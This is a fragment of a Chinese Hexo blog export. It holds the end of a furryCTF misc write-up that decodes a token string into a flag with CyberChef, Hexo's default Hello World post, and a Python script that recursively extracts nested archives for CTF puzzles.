<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1O11111O111111OOO1O1111O111O111OO1O1111O11111O1O1111OO1O1O1OO11OO1OO1O1O1111OO1O11111O1OOO1O111O1OOOO11O1O1OOO1O11111O1OO1OO11OO11111O1O1OOOO11OO111O11OO111O11O1OOOO11O111O1O1O11O1111OO11OOO1OOO1O1O1O11OOOO1O1OO1111OO1OO111OO1OO111O1O1O111OO11OO11O</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="步骤-2：Find-Replace-把-字母-O-换成-0"><a href="#步骤-2：Find-Replace-把-字母-O-换成-0" class="headerlink" title="步骤 2：Find &#x2F; Replace (把 字母 O 换成 0)"></a>步骤 2：Find &#x2F; Replace (把 字母 <code>O</code> 换成 <code>0</code>)</h4><ul>
<li><p><strong>操作</strong>：再拖动一个 <code>Find / Replace</code> 到 <code>Recipe</code> 区域，放在刚才那一步的下面。</p>
</li>
<li><p><strong>配置</strong>：</p>
<ul>
<li>在 <code>Find</code> 框里，填入 <code>O</code>。</li>
<li>在 <code>Replace</code> 框里，填入 <code>0</code>。</li>
</ul>
</li>
<li><p><strong>目的</strong>：完成映射的另一半，把 Token <code>O</code> 转换成二进制里的 <code>0</code>。</p>
</li>
<li><p><strong>中间结果</strong>：现在，<code>Output</code> 框里的内容就是一串纯粹的 <code>0</code> 和 <code>1</code> 了，也就是我们需要的比特流：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10111110111111000101111011101110010111101111101011110010101001100100101011110010111110100010111010000110101000101111101001001100111110101000011001110110011101101000011011101010110111100110001000101010110000101001111001001110010011101010111001100110</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="步骤-3：Reverse-反转"><a href="#步骤-3：Reverse-反转" class="headerlink" title="步骤 3：Reverse (反转)"></a>步骤 3：Reverse (反转)</h4><ul>
<li><strong>操作</strong>：在左侧搜索 <code>Reverse</code>，拖到 <code>Recipe</code> 中，放在第二步之后。</li>
<li><strong>配置</strong>：保持默认选项 <code>Mode: Standard (character)</code> 即可。</li>
<li><strong>目的</strong>：这是解题的关键一步。直接把二进制转文本会是乱码，我们猜测可能存在“整体倒序”的混淆。这一步就是把整条比特流从头到尾反转过来。</li>
<li><strong>中间结果</strong>：<code>Output</code> 框里的比特流现在是倒序的了：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011101010111001001110010011110010100001101010100010001100111101101010111011000010110111001101110011000010101111100110010010111110100010101100001011101000101111101001111010100100110010101001111010111110111101001110111011110100011111101111101</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="步骤-4：From-Binary-从二进制转换"><a href="#步骤-4：From-Binary-从二进制转换" class="headerlink" title="步骤 4：From Binary (从二进制转换)"></a>步骤 4：From Binary (从二进制转换)</h4><ul>
<li><p><strong>操作</strong>：在左侧搜索 <code>From Binary</code>，拖到 <code>Recipe</code> 的最后。</p>
</li>
<li><p><strong>配置</strong>：</p>
<ul>
<li>在下面的选项中，确保 <code>Data format</code> 是 <code>Binary</code>，并且 <code>Length</code> 是 <code>8</code>。</li>
<li>其他选项默认就行。</li>
</ul>
</li>
<li><p><strong>目的</strong>：将反转后的比特流，按照每 8 位一个字节的标准，翻译成 ASCII 字符。</p>
</li>
<li><p><strong>最终结果</strong>：<code>Output</code> 框里会清晰地显示出 flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">furryCTF&#123;Wanna_2_Eat_OReO_zwz?&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>最后总结一下像这种有很多重复字符的字符串，你其实应该想到把重复字符看做0和1,只不过字符的整体需要一点经验，比如本题的RE和O，你只要想到O很像0其实就能联想到RE可能是1了。</p>
<p>当然可能还有另一种情况就是摩斯电码，这题很好有这个小彩蛋，但算个迷惑项。</p>
<ul>
<li><strong>RE</strong> &#x3D; <strong><code>.</code></strong> (点)</li>
<li><strong>O</strong> &#x3D; <strong><code>-</code></strong> (划)</li>
<li><strong>OO</strong> &#x3D; <strong>字母之间的分隔符</strong> (我用单个空格<code> </code>表示)</li>
<li><strong>OOO</strong> &#x3D; <strong>单词之间的分隔符</strong> (我用斜杠<code>/</code>表示)</li>
</ul>
<p>根据这个规则，得到下面的标准摩尔斯电码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-. . ...- . .-. / --. --- -. -. . / --. .. ...- . / -.-- --- ..- / ..- .--. / -. . ...- . .-. / --. --- -. -. . / .-.. . - / -.-- --- ..- / -.. --- .-- -.</span><br></pre></td></tr></table></figure>

<p>你拖进随波逐流解密一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NEVERGONNEGIVEYOUUPNEVERGONNELETYOUDOWN</span><br></pre></td></tr></table></figure>

<p>又是经典诈骗。</p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>ctf-wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>ctf</tag>
        <tag>furryCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/12/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>压缩包各种类型解压脚本（适合套娃题）</title>
    <url>/2026/01/05/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E8%A7%A3%E5%8E%8B%E8%84%9A%E6%9C%AC%EF%BC%88%E9%80%82%E5%90%88%E5%A5%97%E5%A8%83%E9%A2%98%EF%BC%89/</url>
    <content><![CDATA[<p>压缩包全解压脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import gzip</span><br><span class="line">import bz2</span><br><span class="line">import lzma</span><br><span class="line">import py7zr</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># --- 配置 ---</span><br><span class="line">START_ARCHIVE = &#x27;layer_1000.7z&#x27;</span><br><span class="line">WORKING_DIR = &#x27;temp_extraction_folder&#x27;</span><br><span class="line">FINAL_DIR = &#x27;final_content&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------</span><br><span class="line"></span><br><span class="line">def is_archive(filename):</span><br><span class="line">    &quot;&quot;&quot;根据文件名后缀判断是否是支持的压缩文件类型（更强大的版本）&quot;&quot;&quot;</span><br><span class="line">    fn_lower = filename.lower()</span><br><span class="line"></span><br><span class="line">    # 标准的以点开头的扩展名</span><br><span class="line">    supported_extensions = [</span><br><span class="line">        &#x27;.7z&#x27;, &#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.gz&#x27;, &#x27;.tgz&#x27;,</span><br><span class="line">        &#x27;.bz2&#x27;, &#x27;.tbz2&#x27;, &#x27;.xz&#x27;, &#x27;.txz&#x27;</span><br><span class="line">    ]</span><br><span class="line">    for ext in supported_extensions:</span><br><span class="line">        if fn_lower.endswith(ext):</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">    # &lt;-- 修改: 增加对 &#x27;tar_gz&#x27; 这类非标准后缀的检查</span><br><span class="line">    if fn_lower.endswith((&#x27;tar_gz&#x27;, &#x27;tar_bz2&#x27;, &#x27;tar_xz&#x27;)):</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decompress_once(file_path, destination_dir):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    对单个文件进行一次解压操作</span><br><span class="line">    返回新解压出的文件名列表</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    print(f&quot;-&gt; 正在解压: &#123;os.path.basename(file_path)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    before_files = set(os.listdir(destination_dir))</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        filename_lower = file_path.lower()</span><br><span class="line"></span><br><span class="line">        # &lt;-- 修改: 将 &#x27;tar_gz&#x27; 等非标准名称加入 tarfile 的处理逻辑中</span><br><span class="line">        # 优先处理 tar 系列压缩包，因为它们可能包含 .gz, .bz2 等后缀</span><br><span class="line">        if filename_lower.endswith(</span><br><span class="line">                (&#x27;.tar&#x27;, &#x27;.tar.gz&#x27;, &#x27;.tgz&#x27;, &#x27;.tar.bz2&#x27;, &#x27;.tbz2&#x27;, &#x27;.tar.xz&#x27;, &#x27;.txz&#x27;, &#x27;tar_gz&#x27;, &#x27;tar_bz2&#x27;, &#x27;tar_xz&#x27;)):</span><br><span class="line">            # &#x27;r:*&#x27; 模式可以自动检测压缩类型 (gz, bz2, xz)</span><br><span class="line">            with tarfile.open(file_path, &#x27;r:*&#x27;) as t:</span><br><span class="line">                t.extractall(path=destination_dir)</span><br><span class="line">        elif filename_lower.endswith(&#x27;.7z&#x27;):</span><br><span class="line">            with py7zr.SevenZipFile(file_path, mode=&#x27;r&#x27;) as z:</span><br><span class="line">                z.extractall(path=destination_dir)</span><br><span class="line">        elif filename_lower.endswith(&#x27;.zip&#x27;):</span><br><span class="line">            with zipfile.ZipFile(file_path, &#x27;r&#x27;) as z:</span><br><span class="line">                z.extractall(path=destination_dir)</span><br><span class="line">        elif filename_lower.endswith(&#x27;.gz&#x27;):</span><br><span class="line">            output_path = os.path.join(destination_dir, os.path.basename(file_path)[:-3])</span><br><span class="line">            with gzip.open(file_path, &#x27;rb&#x27;) as f_in:</span><br><span class="line">                with open(output_path, &#x27;wb&#x27;) as f_out:</span><br><span class="line">                    shutil.copyfileobj(f_in, f_out)</span><br><span class="line">        elif filename_lower.endswith(&#x27;.bz2&#x27;):</span><br><span class="line">            output_path = os.path.join(destination_dir, os.path.basename(file_path)[:-4])</span><br><span class="line">            with bz2.open(file_path, &#x27;rb&#x27;) as f_in:</span><br><span class="line">                with open(output_path, &#x27;wb&#x27;) as f_out:</span><br><span class="line">                    shutil.copyfileobj(f_in, f_out)</span><br><span class="line">        elif filename_lower.endswith(&#x27;.xz&#x27;):</span><br><span class="line">            output_path = os.path.join(destination_dir, os.path.basename(file_path)[:-3])</span><br><span class="line">            with lzma.open(file_path, &#x27;rb&#x27;) as f_in:</span><br><span class="line">                with open(output_path, &#x27;wb&#x27;) as f_out:</span><br><span class="line">                    shutil.copyfileobj(f_in, f_out)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;不支持的文件类型: &#123;file_path&#125;&quot;)</span><br><span class="line">            return []</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解压 &#123;os.path.basename(file_path)&#125; 时发生错误: &#123;e&#125;&quot;)</span><br><span class="line">        # 尝试继续，比如 tarfile 可能会因为文件不是 tar 格式而报错</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    after_files = set(os.listdir(destination_dir))</span><br><span class="line">    new_files = after_files - before_files</span><br><span class="line"></span><br><span class="line">    return [os.path.join(destination_dir, f) for f in new_files]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &quot;&quot;&quot;主执行函数&quot;&quot;&quot;</span><br><span class="line">    start_time = time.time()</span><br><span class="line"></span><br><span class="line">    if not os.path.exists(START_ARCHIVE):</span><br><span class="line">        print(f&quot;错误：初始压缩包 &#x27;&#123;START_ARCHIVE&#125;&#x27; 不存在！&quot;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    if os.path.exists(WORKING_DIR):</span><br><span class="line">        shutil.rmtree(WORKING_DIR)</span><br><span class="line">    os.makedirs(WORKING_DIR)</span><br><span class="line"></span><br><span class="line">    if os.path.exists(FINAL_DIR):</span><br><span class="line">        shutil.rmtree(FINAL_DIR)</span><br><span class="line">    os.makedirs(FINAL_DIR)</span><br><span class="line"></span><br><span class="line">    current_file = os.path.join(WORKING_DIR, os.path.basename(START_ARCHIVE))</span><br><span class="line">    shutil.copy(START_ARCHIVE, current_file)</span><br><span class="line"></span><br><span class="line">    layer_count = 0</span><br><span class="line">    while current_file and is_archive(current_file):</span><br><span class="line">        layer_count += 1</span><br><span class="line">        print(f&quot;\n--- 第 &#123;layer_count&#125; 层 ---&quot;)</span><br><span class="line"></span><br><span class="line">        new_files = decompress_once(current_file, WORKING_DIR)</span><br><span class="line"></span><br><span class="line">        if new_files is None:</span><br><span class="line">            print(&quot;解压过程出错，程序终止。&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        old_file_to_remove = current_file</span><br><span class="line"></span><br><span class="line">        if not new_files:</span><br><span class="line">            print(&quot;解压后未产生新文件，可能已是最后一层。&quot;)</span><br><span class="line">            current_file = None  # 终止循环</span><br><span class="line">        elif len(new_files) == 1:</span><br><span class="line">            current_file = new_files[0]</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;警告：解压后得到 &#123;len(new_files)&#125; 个文件。将自动寻找下一个压缩包。&quot;)</span><br><span class="line">            next_archive = None</span><br><span class="line">            for f in new_files:</span><br><span class="line">                if is_archive(f):</span><br><span class="line">                    next_archive = f</span><br><span class="line">                    print(f&quot;找到下一个目标: &#123;os.path.basename(f)&#125;&quot;)</span><br><span class="line">                    break</span><br><span class="line">            if not next_archive:</span><br><span class="line">                print(&quot;在解压出的多个文件中未找到下一个压缩包，程序终止。&quot;)</span><br><span class="line">            current_file = next_archive</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            if os.path.exists(old_file_to_remove):</span><br><span class="line">                os.remove(old_file_to_remove)</span><br><span class="line">                print(f&quot;&lt;- 已清理: &#123;os.path.basename(old_file_to_remove)&#125;&quot;)</span><br><span class="line">        except OSError as e:</span><br><span class="line">            print(f&quot;清理文件失败: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # 循环结束，处理最终文件</span><br><span class="line">    final_file_path = current_file if current_file else old_file_to_remove</span><br><span class="line">    if os.path.exists(final_file_path):</span><br><span class="line">        print(&quot;\n==========================================&quot;)</span><br><span class="line">        print(&quot;🎉 解压完成！已找到最底层文件。&quot;)</span><br><span class="line">        final_filename = os.path.basename(final_file_path)</span><br><span class="line">        destination_path = os.path.join(FINAL_DIR, final_filename)</span><br><span class="line">        shutil.move(final_file_path, destination_path)</span><br><span class="line">        print(f&quot;最终文件 &#x27;&#123;final_filename&#125;&#x27; 已移动到 &#x27;&#123;FINAL_DIR&#125;&#x27; 文件夹中。&quot;)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            with open(destination_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">                content = f.read(200)</span><br><span class="line">                print(&quot;\n文件内容预览:&quot;)</span><br><span class="line">                print(&quot;--------------------&quot;)</span><br><span class="line">                print(content)</span><br><span class="line">                print(&quot;--------------------&quot;)</span><br><span class="line">                if &quot;flag&quot; in content.lower() or &quot;&#123;&quot; in content:</span><br><span class="line">                    print(&quot;提示：在文件中找到了 &#x27;flag&#x27; 或 &#x27;&#123;&#x27; 等关键词！&quot;)</span><br><span class="line">                    if &quot;flag&#123;I_lOve_Y0u&#125;&quot; in content:</span><br><span class="line">                        print(&quot;\n&gt;&gt;&gt; 恭喜！Flag找到了！&lt;&lt;&lt;&quot;)</span><br><span class="line">        except Exception:</span><br><span class="line">            print(&quot;无法以文本方式读取最终文件，它可能是二进制文件。&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;\n未能找到最终文件。&quot;)</span><br><span class="line"></span><br><span class="line">    shutil.rmtree(WORKING_DIR)</span><br><span class="line">    print(f&quot;临时工作目录 &#x27;&#123;WORKING_DIR&#125;&#x27; 已被清理。&quot;)</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    print(f&quot;\n总耗时: &#123;end_time - start_time:.2f&#125; 秒&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
        <category>ctf小寄巧</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
